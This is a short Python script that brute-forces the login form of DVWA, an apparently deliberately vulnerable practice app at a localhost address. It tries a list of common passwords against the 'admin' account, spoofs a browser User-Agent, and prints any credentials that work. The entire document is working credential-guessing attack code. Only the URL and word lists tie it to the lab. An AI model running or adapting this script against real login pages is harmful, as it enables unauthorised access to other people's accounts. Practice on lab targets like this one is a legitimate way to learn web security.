import requests

# Target URL of the login page
url = 'http://localhost/DVWA/login.php'

# Usernames and passwords to try
usernames = ['admin']
passwords = ['password1', 'password2', '123456', 'admin']

# Headers to mimic a real browser visit
headers = {
    'User-Agent': 'Mozilla/5.0',
}

# Loop through each username
for username in usernames:
    # Loop through each password
    for password in passwords:
        # Data to be sent in POST request
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        # Make the POST request
        response = requests.post(url, headers=headers, data=data)
        
        # Check if login was successful
        if "Login failed" not in response.text:
            print(f'Success! Username: {username} Password: {password}')
            break
    else:
        # Continue to the next username if password is not found
        continue
    # Break out of the loop if password is found
    break
